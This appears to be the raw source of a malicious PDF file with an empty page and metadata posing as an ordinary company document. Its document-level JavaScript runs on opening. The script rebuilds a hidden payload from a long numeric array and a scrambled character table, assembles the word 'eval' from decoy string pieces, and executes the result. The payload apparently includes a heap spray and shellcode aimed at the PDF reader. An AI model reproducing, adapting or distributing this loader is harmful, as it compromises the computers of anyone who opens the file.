%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[27,
13,
39,
18,
62,
38,
5,
63,
46,
8,
70,
70,
5,
63,
73,
16,
26,
56,
5,
63,
46,
52,
73,
16,
5,
63,
4,
52,
26,
56,
5,
63,
26,
59,
8,
56,
5,
63,
8,
8,
52,
73,
5,
63,
70,
56,
16,
44,
5,
63,
56,
44,
46,
27,
5,
63,
46,
27,
8,
44,
5,
63,
44,
16,
56,
44,
5,
63,
4,
44,
46,
27,
5,
63,
52,
70,
9,
16,
5,
63,
4,
70,
46,
27,
5,
63,
8,
8,
44,
46,
5,
63,
70,
70,
64,
27,
5,
63,
52,
26,
46,
27,
5,
63,
44,
8,
8,
16,
5,
63,
8,
8,
4,
56,
5,
63,
46,
9,
2,
16,
5,
63,
9,
52,
26,
26,
5,
63,
73,
73,
9,
44,
5,
63,
27,
46,
73,
73,
5,
63,
56,
44,
46,
27,
5,
63,
16,
8,
8,
44,
5,
63,
8,
59,
56,
70,
5,
63,
4,
52,
44,
70,
5,
63,
46,
4,
73,
27,
5,
63,
2,
56,
8,
56,
5,
63,
26,
56,
46,
52,
5,
63,
52,
9,
4,
52,
5,
63,
26,
27,
26,
59,
5,
63,
52,
9,
56,
16,
5,
63,
46,
27,
52,
70,
5,
63,
8,
16,
4,
52,
5,
63,
4,
56,
46,
27,
5,
63,
4,
46,
8,
52,
5,
63,
73,
52,
44,
8,
5,
63,
46,
27,
52,
70,
5,
63,
2,
44,
4,
70,
5,
63,
73,
52,
44,
8,
5,
63,
16,
59,
8,
8,
5,
63,
56,
9,
56,
59,
5,
63,
50,
64,
73,
16,
5,
63,
16,
52,
44,
8,
5,
63,
64,
27,
8,
8,
5,
63,
27,
26,
44,
73,
5,
63,
8,
46,
9,
44,
5,
63,
4,
56,
73,
2,
5,
63,
16,
9,
44,
46,
5,
63,
44,
64,
16,
27,
5,
63,
64,
50,
44,
8,
5,
63,
26,
27,
56,
44,
5,
63,
8,
27,
73,
9,
5,
63,
4,
52,
9,
73,
5,
63,
52,
26,
26,
70,
5,
63,
52,
26,
46,
27,
5,
63,
44,
8,
2,
56,
5,
63,
70,
70,
64,
64,
5,
63,
44,
16,
46,
27,
5,
63,
46,
64,
56,
27,
5,
63,
26,
16,
56,
70,
5,
63,
52,
56,
73,
73,
5,
63,
44,
16,
2,
56,
5,
63,
64,
46,
46,
27,
5,
63,
64,
64,
44,
8,
5,
63,
44,
56,
46,
27,
5,
63,
44,
8,
46,
27,
5,
63,
50,
27,
16,
52,
5,
63,
52,
59,
52,
26,
5,
63,
26,
27,
16,
8,
5,
63,
50,
64,
52,
8,
5,
63,
70,
46,
46,
27,
5,
63,
46,
44,
2,
44,
5,
63,
44,
16,
4,
64,
5,
63,
4,
56,
8,
8,
5,
63,
59,
70,
44,
8,
5,
63,
73,
8,
26,
27,
5,
63,
70,
46,
46,
27,
5,
63,
46,
27,
44,
46,
5,
63,
70,
50,
73,
4,
5,
63,
52,
59,
44,
52,
5,
63,
59,
46,
26,
46,
5,
63,
73,
73,
73,
73,
5,
63,
26,
2,
73,
73,
5,
63,
26,
46,
73,
59,
5,
63,
44,
44,
44,
44,
5,
63,
44,
44,
44,
44,
5,
63,
52,
44,
52,
46,
5,
63,
56,
44,
70,
50,
5,
63,
73,
73,
70,
46,
5,
63,
44,
44,
44,
44,
5,
63,
52,
44,
44,
44,
5,
63,
16,
44,
46,
8,
5,
63,
52,
44,
9,
59,
5,
63,
46,
27,
52,
52,
5,
63,
46,
27,
26,
16,
5,
63,
9,
44,
52,
26,
5,
63,
16,
8,
46,
8,
5,
63,
73,
73,
44,
52,
5,
63,
70,
46,
26,
8,
5,
63,
70,
26,
70,
73,
5,
63,
44,
44,
44,
44,
5,
63,
4,
52,
70,
46,
5,
63,
70,
16,
4,
2,
5,
63,
52,
56,
70,
64,
5,
63,
9,
70,
73,
73,
5,
63,
16,
56,
46,
8,
5,
63,
46,
27,
44,
46,
5,
63,
26,
46,
26,
46,
5,
63,
73,
73,
70,
9,
5,
63,
73,
73,
73,
73,
5,
63,
44,
2,
26,
27,
5,
63,
4,
2,
26,
27,
5,
63,
26,
16,
46,
9,
5,
63,
44,
9,
44,
56,
5,
63,
44,
44,
44,
44,
5,
63,
52,
16,
46,
64,
5,
63,
44,
16,
2,
56,
5,
63,
44,
56,
16,
4,
5,
63,
4,
2,
2,
56,
5,
63,
70,
4,
70,
52,
5,
63,
16,
4,
4,
8,
5,
63,
2,
56,
56,
56,
5,
63,
4,
70,
44,
56,
5,
63,
8,
8,
4,
2,
5,
63,
16,
4,
8,
2,
5,
63,
2,
56,
56,
56,
5,
63,
2,
44,
44,
46,
5,
63,
4,
8,
2,
64,
5,
63,
52,
8,
2,
44,
5,
63,
73,
46,
70,
46,
5,
63,
44,
44,
44,
44,
5,
63,
73,
73,
44,
44,
5,
63,
44,
16,
52,
70,
5,
63,
26,
46,
46,
27,
5,
63,
16,
59,
8,
8,
5,
63,
16,
4,
52,
9,
5,
63,
9,
64,
56,
56,
5,
63,
4,
4,
44,
44,
5,
63,
70,
2,
4,
44,
5,
63,
16,
4,
4,
56,
5,
63,
9,
64,
56,
56,
5,
63,
2,
26,
44,
52,
5,
63,
70,
16,
70,
56,
5,
63,
16,
70,
70,
16,
5,
63,
9,
64,
56,
56,
5,
63,
44,
44,
44,
59,
5,
63,
46,
50,
52,
59,
5,
63,
44,
56,
16,
9,
5,
63,
46,
46,
8,
44,
5,
63,
9,
64,
56,
56,
5,
63,
56,
9,
44,
56,
5,
63,
70,
50,
52,
9,
5,
63,
70,
50,
44,
44,
5,
63,
52,
8,
44,
44,
5,
63,
70,
50,
52,
4,
5,
63,
73,
73,
44,
44,
5,
63,
9,
56,
52,
70,
5,
63,
16,
44,
46,
52,
5,
63,
9,
70,
4,
52,
5,
63,
44,
44,
70,
50,
5,
63,
73,
73,
52,
8,
5,
63,
44,
56,
52,
70,
5,
63,
44,
44,
70,
50,
5,
63,
26,
27,
46,
8,
5,
63,
52,
8,
44,
16,
5,
63,
52,
70,
73,
73,
5,
63,
46,
8,
44,
56,
5,
63,
44,
16,
16,
8,
5,
63,
44,
2,
26,
27,
5,
63,
9,
8,
26,
27,
5,
63,
46,
44,
56,
4,
5,
63,
44,
44,
8,
73,
5,
63,
73,
50,
4,
52,
5,
63,
46,
44,
56,
4,
5,
63,
44,
44,
8,
73,
5,
63,
16,
56,
4,
52,
5,
63,
44,
44,
70,
50,
5,
63,
73,
26,
70,
50,
5,
63,
52,
70,
73,
73,
5,
63,
26,
46,
44,
46,
5,
63,
73,
26,
59,
16,
5,
63,
73,
73,
73,
73,
5,
63,
56,
26,
46,
26,
5,
63,
26,
16,
44,
26,
5,
63,
73,
26,
59,
46,
5,
63,
44,
26,
46,
50,
5,
63,
70,
73,
46,
59,
5,
63,
27,
64,
44,
9,
5,
63,
16,
50,
8,
8,
5,
63,
52,
27,
46,
50,
5,
63,
16,
70,
9,
27,
5,
63,
4,
59,
56,
70,
5,
63,
9,
50,
8,
70,
5,
63,
4,
44,
2,
73,
5,
63,
4,
56,
70,
46,
5,
63,
4,
44,
4,
56,
5,
63,
2,
73,
8,
50,
5,
63,
70,
70,
2,
73,
5,
63,
70,
16,
70,
59,
5,
63,
4,
8,
70,
52,
5,
63,
4,
2,
70,
52,
5,
63,
70,
52,
4,
70,
5,
63,
8,
59,
8,
52,
5,
63,
2,
26,
8,
46,
5,
63,
70,
26,
70,
59,
5,
63,
70,
73,
70,
70,
5,
63,
4,
4,
2,
73,
5,
63,
4,
44,
2,
26,
5,
63,
4,
44,
70,
46,
5,
63,
70,
70,
8,
73,
5,
63,
8,
2,
8,
64,
5,
63,
2,
70,
8,
2,
5,
63,
8,
64,
70,
52,
5,
63,
44,
44,
8,
8,
5,
63,
44,
44,
44,
44,
38,
47,
73,
63,
23,
16,
66,
24,
12,
23,
51,
26,
55,
43,
48,
37,
48,
50,
68,
45,
28,
33,
6,
74,
42,
24,
11,
26,
37,
48,
50,
40,
11,
26,
23,
18,
66,
42,
20,
2,
19,
45,
28,
33,
6,
48,
50,
35,
62,
48,
50,
47,
36,
48,
50,
62,
48,
50,
40,
39,
63,
27,
39,
66,
48,
24,
23,
18,
37,
44,
68,
45,
28,
34,
2,
33,
47,
48,
26,
66,
63,
48,
23,
51,
48,
50,
47,
36,
51,
73,
63,
23,
16,
66,
24,
12,
23,
51,
27,
25,
37,
33,
6,
43,
50,
48,
51,
64,
53,
18,
62,
23,
26,
74,
51,
1,
48,
48,
50,
28,
37,
33,
47,
43,
50,
48,
51,
43,
74,
62,
44,
25,
44,
16,
44,
16,
44,
16,
44,
16,
47,
43,
50,
48,
51,
50,
64,
64,
48,
62,
44,
25,
56,
44,
44,
44,
44,
44,
47,
43,
50,
48,
51,
71,
50,
28,
11,
12,
50,
64,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
27,
13,
39,
18,
33,
47,
43,
50,
48,
51,
39,
16,
22,
11,
26,
23,
62,
71,
50,
28,
11,
12,
50,
64,
40,
11,
26,
23,
18,
66,
42,
20,
2,
47,
43,
50,
48,
51,
45,
28,
62,
50,
64,
64,
48,
58,
37,
39,
16,
22,
11,
26,
23,
35,
44,
25,
8,
46,
33,
47,
43,
50,
48,
51,
28,
50,
48,
39,
71,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
63,
59,
44,
59,
44,
5,
63,
59,
44,
59,
44,
69,
33,
47,
28,
50,
48,
39,
71,
62,
26,
55,
43,
48,
37,
28,
50,
48,
39,
71,
68,
45,
28,
33,
47,
43,
50,
48,
51,
16,
12,
63,
23,
66,
2,
62,
37,
43,
74,
58,
44,
25,
56,
44,
44,
44,
44,
44,
33,
34,
50,
64,
64,
48,
47,
73,
12,
48,
37,
43,
50,
48,
51,
16,
12,
63,
23,
66,
62,
44,
47,
16,
12,
63,
23,
66,
19,
16,
12,
63,
23,
66,
2,
47,
16,
12,
63,
23,
66,
35,
35,
33,
6,
64,
53,
18,
30,
16,
12,
63,
23,
66,
61,
62,
28,
50,
48,
39,
71,
35,
71,
50,
28,
11,
12,
50,
64,
47,
36,
51,
43,
50,
48,
51,
12,
43,
26,
48,
73,
11,
12,
74,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
63,
44,
16,
44,
16,
5,
63,
44,
16,
44,
16,
69,
33,
47,
74,
42,
24,
11,
26,
37,
12,
43,
26,
48,
73,
11,
12,
74,
40,
11,
26,
23,
18,
66,
42,
19,
56,
56,
59,
52,
2,
33,
6,
12,
43,
26,
48,
73,
11,
12,
74,
35,
62,
12,
43,
26,
48,
73,
11,
12,
74,
47,
36,
51,
66,
42,
24,
39,
40,
16,
12,
11,
11,
50,
27,
0,
66,
12,
48,
26,
62,
49,
12,
11,
11,
50,
27,
40,
16,
12,
11,
11,
26,
16,
66,
67,
57,
50,
24,
11,
14,
23,
73,
12,
37,
6,
39,
63,
27,
13,
15,
69,
69,
68,
57,
39,
18,
15,
12,
43,
26,
48,
73,
11,
12,
74,
36,
33,
47,
36,
51,
73,
63,
23,
16,
66,
24,
12,
23,
51,
71,
48,
24,
23,
66,
73,
37,
33,
6,
23,
12,
71,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
63,
44,
1,
44,
1,
5,
63,
44,
1,
44,
1,
5,
63,
44,
1,
44,
1,
5,
63,
44,
1,
44,
1,
69,
33,
47,
43,
50,
48,
51,
71,
50,
28,
11,
12,
50,
64,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
27,
13,
39,
18,
33,
47,
42,
26,
50,
71,
27,
11,
12,
16,
53,
62,
23,
12,
71,
35,
71,
50,
28,
11,
12,
50,
64,
47,
27,
24,
18,
27,
11,
12,
16,
53,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
63,
44,
1,
44,
1,
5,
63,
44,
1,
44,
1,
69,
33,
47,
42,
26,
50,
64,
26,
48,
39,
24,
55,
26,
62,
2,
44,
47,
39,
71,
48,
50,
28,
62,
42,
26,
50,
64,
26,
48,
39,
24,
55,
26,
35,
42,
26,
50,
71,
27,
11,
12,
16,
53,
40,
11,
26,
23,
18,
66,
42,
47,
74,
42,
24,
11,
26,
37,
27,
24,
18,
27,
11,
12,
16,
53,
40,
11,
26,
23,
18,
66,
42,
19,
39,
71,
48,
50,
28,
33,
6,
27,
24,
18,
27,
11,
12,
16,
53,
35,
62,
27,
24,
18,
27,
11,
12,
16,
53,
47,
36,
51,
73,
24,
11,
11,
27,
11,
12,
16,
53,
62,
27,
24,
18,
27,
11,
12,
16,
53,
40,
39,
63,
27,
39,
66,
48,
24,
23,
18,
37,
44,
68,
39,
71,
48,
50,
28,
33,
47,
27,
11,
12,
16,
53,
62,
27,
24,
18,
27,
11,
12,
16,
53,
40,
39,
63,
27,
39,
66,
48,
24,
23,
18,
37,
44,
68,
27,
24,
18,
27,
11,
12,
16,
53,
40,
11,
26,
23,
18,
66,
42,
58,
39,
71,
48,
50,
28,
33,
47,
74,
42,
24,
11,
26,
37,
27,
11,
12,
16,
53,
40,
11,
26,
23,
18,
66,
42,
35,
39,
71,
48,
50,
28,
19,
44,
25,
56,
44,
44,
44,
44,
33,
6,
27,
11,
12,
16,
53,
62,
27,
11,
12,
16,
53,
35,
27,
11,
12,
16,
53,
35,
73,
24,
11,
11,
27,
11,
12,
16,
53,
47,
36,
51,
57,
26,
57,
62,
23,
26,
74,
51,
1,
48,
48,
50,
28,
37,
33,
47,
73,
12,
48,
37,
24,
62,
44,
47,
24,
19,
9,
56,
44,
44,
47,
24,
35,
35,
33,
6,
57,
26,
57,
30,
24,
61,
62,
27,
11,
12,
16,
53,
35,
42,
26,
50,
71,
27,
11,
12,
16,
53,
47,
36,
51,
43,
50,
48,
51,
23,
63,
57,
62,
9,
2,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
59,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
47,
63,
66,
24,
11,
40,
71,
48,
24,
23,
66,
73,
37,
69,
5,
56,
52,
44,
44,
44,
73,
69,
68,
23,
63,
57,
33,
47,
36,
51,
73,
63,
23,
16,
66,
24,
12,
23,
51,
18,
26,
66,
24,
16,
12,
23,
37,
33,
6,
43,
50,
48,
51,
50,
48,
48,
28,
62,
23,
26,
74,
51,
1,
48,
48,
50,
28,
37,
33,
47,
24,
73,
37,
50,
71,
71,
40,
64,
12,
16,
40,
49,
12,
11,
11,
50,
27,
40,
18,
26,
66,
14,
16,
12,
23,
33,
6,
43,
50,
48,
51,
71,
50,
28,
11,
12,
50,
64,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
27,
13,
39,
18,
33,
47,
43,
50,
48,
51,
42,
54,
45,
52,
44,
44,
49,
3,
62,
71,
50,
28,
11,
12,
50,
64,
40,
11,
26,
23,
18,
66,
42,
20,
2,
47,
43,
50,
48,
51,
45,
28,
62,
44,
25,
56,
44,
44,
44,
44,
44,
58,
37,
42,
54,
45,
52,
44,
44,
49,
3,
35,
44,
25,
8,
46,
33,
47,
43,
50,
48,
51,
28,
50,
48,
39,
71,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
63,
59,
44,
59,
44,
5,
63,
59,
44,
59,
44,
69,
33,
47,
28,
50,
48,
39,
71,
62,
26,
55,
43,
48,
37,
28,
50,
48,
39,
71,
68,
45,
28,
33,
47,
43,
50,
48,
51,
71,
52,
1,
13,
32,
70,
52,
73,
62,
37,
44,
25,
44,
16,
44,
16,
44,
16,
44,
16,
58,
44,
25,
56,
44,
44,
44,
44,
44,
33,
34,
44,
25,
56,
44,
44,
44,
44,
44,
47,
73,
12,
48,
37,
43,
50,
48,
51,
43,
45,
16,
17,
65,
59,
70,
28,
62,
44,
47,
43,
45,
16,
17,
65,
59,
70,
28,
19,
71,
52,
1,
13,
32,
70,
52,
73,
47,
43,
45,
16,
17,
65,
59,
70,
28,
35,
35,
33,
6,
50,
48,
48,
28,
30,
43,
45,
16,
17,
65,
59,
70,
28,
61,
62,
28,
50,
48,
39,
71,
35,
71,
50,
28,
11,
12,
50,
64,
47,
36,
51,
43,
50,
48,
51,
66,
41,
60,
42,
3,
27,
72,
74,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
69,
5,
44,
59,
69,
33,
47,
74,
42,
24,
11,
26,
37,
66,
41,
60,
42,
3,
27,
72,
74,
40,
11,
26,
23,
18,
66,
42,
19,
44,
25,
56,
44,
44,
44,
33,
6,
66,
41,
60,
42,
3,
27,
72,
74,
35,
62,
66,
41,
60,
42,
3,
27,
72,
74,
47,
36,
51,
66,
41,
60,
42,
3,
27,
72,
74,
62,
69,
3,
40,
69,
35,
66,
41,
60,
42,
3,
27,
72,
74,
47,
50,
71,
71,
40,
64,
12,
16,
40,
49,
12,
11,
11,
50,
27,
40,
18,
26,
66,
14,
16,
12,
23,
37,
66,
41,
60,
42,
3,
27,
72,
74,
33,
47,
36,
36,
51,
50,
75,
11,
63,
18,
24,
23,
39,
62,
50,
71,
71,
40,
71,
11,
63,
18,
14,
23,
39,
47,
43,
50,
48,
51,
39,
43,
62,
71,
50,
48,
39,
26,
14,
23,
66,
37,
50,
71,
71,
40,
43,
24,
26,
74,
26,
48,
21,
26,
48,
39,
24,
12,
23,
40,
66,
12,
0,
66,
48,
24,
23,
18,
37,
33,
40,
16,
42,
50,
48,
1,
66,
37,
44,
33,
33,
47,
73,
12,
48,
37,
43,
50,
48,
51,
24,
62,
44,
47,
24,
19,
50,
75,
11,
63,
18,
24,
23,
39,
40,
11,
26,
23,
18,
66,
42,
47,
24,
35,
35,
33,
6,
24,
73,
37,
50,
75,
11,
63,
18,
24,
23,
39,
30,
24,
61,
40,
23,
50,
57,
26,
62,
62,
38,
67,
0,
16,
48,
24,
71,
66,
38,
33,
6,
43,
50,
48,
51,
11,
43,
62,
50,
75,
11,
63,
18,
24,
23,
39,
30,
24,
61,
40,
43,
26,
48,
39,
24,
12,
23,
47,
36,
36,
51,
24,
73,
37,
37,
11,
43,
62,
62,
59,
33,
7,
7,
37,
37,
39,
43,
62,
62,
46,
33,
10,
10,
37,
11,
43,
19,
62,
46,
40,
9,
2,
33,
33,
33,
6,
18,
26,
66,
24,
16,
12,
23,
37,
33,
47,
36,
26,
11,
39,
26,
51,
24,
73,
37,
11,
43,
62,
62,
4,
40,
9,
33,
6,
71,
48,
24,
23,
66,
73,
37,
33,
47,
36,
26,
11,
39,
26,
51,
24,
73,
37,
37,
37,
39,
43,
62,
62,
70,
33,
7,
7,
37,
39,
43,
62,
62,
4,
33,
33,
10,
10,
37,
11,
43,
19,
4,
40,
9,
9,
33,
33,
6,
27,
25,
37,
33,
47,
36,
26,
11,
39,
26,
51,
24,
73,
37,
37,
11,
43,
29,
62,
59,
40,
9,
33,
7,
7,
37,
11,
43,
19,
62,
59,
40,
2,
33,
7,
7,
37,
11,
43,
29,
62,
46,
40,
9,
8,
33,
7,
7,
37,
11,
43,
19,
62,
46,
40,
9,
4,
33,
33,
6,
73,
63,
23,
16,
66,
24,
12,
23,
51,
50,
37,
33,
6,
63,
66,
24,
11,
40,
71,
48,
24,
23,
66,
64,
37,
38,
71,
31,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
51,
15,
51,
28,
28,
28,
28,
9,
9,
9,
38,
68,
23,
26,
74,
51,
65,
50,
66,
26,
37,
33,
33,
47,
36,
43,
50,
48,
51,
42,
62,
50,
71,
71,
40,
71,
11,
63,
18,
14,
23,
39,
47,
73,
12,
48,
37,
43,
50,
48,
51,
73,
62,
44,
47,
73,
19,
42,
40,
11,
26,
23,
18,
66,
42,
47,
73,
35,
35,
33,
6,
24,
73,
37,
42,
30,
73,
61,
40,
23,
50,
57,
26,
62,
62,
38,
67,
0,
16,
48,
24,
71,
66,
38,
33,
6,
43,
50,
48,
51,
24,
62,
42,
30,
73,
61,
40,
43,
26,
48,
39,
24,
12,
23,
47,
36,
36,
51,
24,
73,
37,
37,
24,
29,
46,
40,
9,
2,
33,
10,
10,
37,
24,
19,
46,
40,
2,
33,
33,
6,
16,
62,
23,
26,
74,
51,
1,
48,
48,
50,
28,
37,
33,
47,
43,
50,
48,
51,
64,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
38,
5,
63,
59,
44,
59,
44,
5,
63,
59,
44,
59,
44,
38,
33,
47,
43,
50,
48,
51,
26,
62,
63,
23,
26,
39,
16,
50,
71,
26,
37,
27,
13,
39,
18,
33,
47,
74,
42,
24,
11,
26,
37,
64,
40,
11,
26,
23,
18,
66,
42,
19,
62,
44,
25,
46,
44,
44,
44,
33,
6,
64,
35,
62,
64,
47,
36,
64,
62,
64,
40,
39,
63,
27,
39,
66,
48,
37,
44,
68,
44,
25,
46,
44,
44,
44,
58,
26,
40,
11,
26,
23,
18,
66,
42,
33,
47,
73,
12,
48,
37,
73,
62,
44,
47,
73,
19,
2,
59,
44,
44,
47,
73,
35,
35,
33,
6,
16,
30,
73,
61,
62,
64,
35,
26,
47,
36,
50,
37,
33,
47,
50,
37,
33,
47,
66,
48,
28,
6,
66,
42,
24,
39,
40,
57,
26,
64,
24,
50,
40,
23,
26,
74,
75,
11,
50,
28,
26,
48,
37,
23,
63,
11,
11,
33,
47,
36,
16,
50,
66,
16,
42,
37,
26,
33,
6,
36,
50,
37,
33,
47,
36,
36];
cc={q:"SA2N7%{|31&lojI:cQg<*V_nixeby>[@K\)/+}\('s.Uhv0q8;rCa 5kWz4m-9M]=udDtE,'6pGfwP"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3860<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF